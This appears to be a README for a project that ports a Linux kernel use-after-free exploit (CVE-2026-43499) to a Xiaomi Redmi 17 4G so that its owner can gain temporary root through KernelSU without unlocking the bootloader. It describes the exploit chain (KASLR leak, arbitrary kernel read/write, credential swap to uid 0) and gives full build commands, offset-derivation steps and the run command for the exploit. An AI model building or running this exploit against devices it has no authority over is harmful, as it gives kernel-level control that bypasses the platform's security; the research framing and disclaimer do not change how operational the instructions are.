# KernelSU Root — Xiaomi Redmi 17 4G (leedsa)

Temporary root for the **Xiaomi Redmi 17 4G** with a **locked bootloader**, achieved by
adapting the CVE-2026-43499 (GhostLock) kernel exploit to this device's MediaTek
MT6768 (Helio G85) SoC and porting the [pixel-ksu-root](https://github.com/JingMatrix/pixel-ksu-root)
runner framework to work with Xiaomi's GKI kernel build.

No bootloader unlock. No flashing. No partition writes. A reboot is the uninstall.

---

## Supported Device

| Spec | Value |
|------|-------|
| Model | Redmi 17 4G (2606FRN72Y) |
| Codename | `leedsa` / `leedsa_n_global` |
| SoC | MediaTek MT6768 (Helio G85) |
| Kernel | `6.6.118-android15-8-ge56cf6b09cca-ab15511674-4k` |
| KMI | `android15-6.6` |
| Build | `OS3.0.310.0.WDTMIXM` (HyperOS 3.0, Android 16) |
| Bootloader | **Locked** (required — do not unlock) |

## How It Works

The CVE-2026-43499 vulnerability is a use-after-free in the Linux kernel's
futex PI subsystem (`remove_waiter()` leaves a dangling `rt_mutex_waiter`
that `pselect(2)` re-occupies on the stack). The exploitation chain:
KASLR leak — pselect stack overlap corrupts nfulnl_logger,
read back via /proc/sys/kernel/random/boot_id
Arbitrary R/W — pipe-buffer page reclaim → phys read/write primitive
Credential swap — overwrite task->cred with init_cred → uid=0
KernelSU late-load — finit_module() loads kernelsu.ko from the manager APK
text


After the module loads, the installed KernelSU manager app takes over
completely. Root survives until the next reboot.

## Prerequisites

- **Windows** with [MSYS2 UCRT64](https://www.msys2.org/) (NOT Git Bash —
  path conversion will break the runner)
- [Android NDK r30+](https://developer.android.com/ndk/downloads)
- A **full OTA ZIP** matching your exact firmware build
- [pixel-ksu-root](https://github.com/JingMatrix/pixel-ksu-root) cloned
- KernelSU manager installed on the phone (any KernelSU variant works)

## Quick Start

### 1. Set up the environment (UCRT64 shell)

```bash
pacman -S --noconfirm make coreutils python

export MSYS2_ARG_CONV_EXCL="*"
export MSYS_NO_PATHCONV=1
export SHELL=/bin/bash
export PATH="/usr/bin:/ucrt64/bin:/c/Downloads/platform-tools:$PATH"
2. Copy this repo's files into pixel-ksu-root
Bash

# Kernel header
cp target/android15-6.6-ab15511674.h \
   pixel-ksu-root/cves/targets/kernel/

# JSON databases (targets + vulns verdict)
cp patches/targets-with-leedsa.json  pixel-ksu-root/data/targets.json
cp patches/vulns-with-leedsa.json    pixel-ksu-root/data/vulns.json

# MSYS2-compatible install.sh (fixes unzip + path issues)
cp patches/install-msys-fix.sh \
   pixel-ksu-root/runner/lib/install.sh
3. Fix the WORKDIR path issue
In pixel-ksu-root/pixel-ksu-root, find the line:

Bash

WORKDIR="$(mktemp -d)"
Replace with:

Bash

WORKDIR="$(cygpath -m "$REPO")/.workdir"
rm -rf "$WORKDIR"
mkdir -p "$WORKDIR"
4. Build the payload
Bash

cd pixel-ksu-root

python3 tools/pixel-image/derive_offsets.py \
  --image leedsa_Image \
  --kallsyms target/leedsa-kallsyms.txt \
  --target leedsa-OS3.0.310.0.WDTMIXM \
  > cves/targets/kernel/android15-6.6-ab15511674.h

# Add include guards + runtime facts (see scripts/add-verdict.py for reference)

make -C cves TARGET=leedsa-OS3.0.310.0.WDTMIXM RECIPE=ghostlock all \
  SHELL=/bin/bash \
  ANDROID_NDK_HOME=/c/Downloads/android-ndk-r30 \
  TARGET_CC="/c/Downloads/android-ndk-r30/toolchains/llvm/prebuilt/windows-x86_64/bin/aarch64-linux-android35-clang -include stddef.h"

mkdir -p artifacts/exploits
cp cves/build/leedsa-OS3.0.310.0.WDTMIXM/cve-2026-43499-ghostlock.so \
   artifacts/exploits/cve-2026-43499-ghostlock-android15-6.6-ab15511674.so

cp cves/build/leedsa-OS3.0.310.0.WDTMIXM/cve-2026-43499-root \
   artifacts/cve-helper
5. Root
Bash

./pixel-ksu-root --manager me.weishu.kernelsu
The runner will:

Reboot the device for a clean shot
Run the exploit (up to 4 attempts, each racing the kernel)
Late-load the KernelSU module
Verify and report
Expected output on success:

text

KernelSU driver live: version=32601
SUCCESS — KernelSU is loaded and answering (version=32601)
6. Grant root to apps
Open the KernelSU manager app → Superuser tab → toggle root for any app you want.

Extracting the kernel from your OTA
If you need to regenerate leedsa-kallsyms.txt or the kernel Image:

Bash

# Decompress boot.img (Xiaomi ships it GZIP-compressed)
python3 -c "
import struct, gzip
d = open('boot.img','rb').read()
ks = struct.unpack_from('<I', d, 8)[0]
hs = struct.unpack_from('<I', d, 20)[0]
koff = (hs + 4095) & ~4095
compressed = d[koff:koff+ks]
open('boot_uncompressed.img','wb').write(
    struct.pack_from('<I', d, 8, len(gzip.decompress(compressed))) and
    d[:hs] + b'\x00'*(koff-hs) + gzip.decompress(compressed)
)
"

# Extract raw kernel Image
python3 -c "
import struct
d = open('boot_uncompressed.img','rb').read()
ks = struct.unpack_from('<I', d, 8)[0]
hs = struct.unpack_from('<I', d, 20)[0]
koff = (hs + 4095) & ~4095
open('leedsa_Image','wb').write(d[koff:koff+ks])
"

# Dump kallsyms (110,105 symbols)
# See scripts/dump_kallsyms.py — uses the kallsyms recovery from
# Linuxoid-cn/CVE-2026-43499-Poc-Analysis's generate_target.py
Known Issues
Issue	Status	Notes
Apps crash during exploit	Expected	The heap spray (memfd + socket reclaim) causes memory pressure on 4GB devices. Apps recover after reboot.
Su daemon dies after late-load	By design	The temp su is replaced by KernelSU's own su.
Exec format error on prebuilt .ko	Resolved	The kernel has CFI_CLANG enabled — prebuilt modules from other builds are rejected. Must build from source with matching config.
Reboot loses root	By design	LKM mode is temporary. Re-run the exploit after each reboot.
Physical Memory Map (for target.h)
text

p0_phys_offset:        0x40000000    (DRAM base, MT6768)
p0_kernel_phys_load:   0x40080000    (arm64 Image text_offset standard)
KIMAGE_TEXT_BASE:      0xffffffc080000000  (VA_BITS=39)
Credits
JingMatrix/pixel-ksu-root — The runner framework, exploit architecture, and build system. This repo is a port of their work to the Redmi 17.
Linuxoid-cn/CVE-2026-43499-Poc-Analysis — The original exploit source and target generator.
NebuSec (Kernix) — CVE-2026-43499 research and disclosure.
tiann/KernelSU / rsuntk/ReSukiSU — The kernel modules and manager apps.
KernelSnitch (TU Graz, NDSS 2025) — The heap pointer side channel technique.
Disclaimer
This project is for educational and research purposes only. Use it only on
devices you own or have explicit authorization to test. The authors are not
responsible for any damage, data loss, or legal consequences arising from the
use of this software.
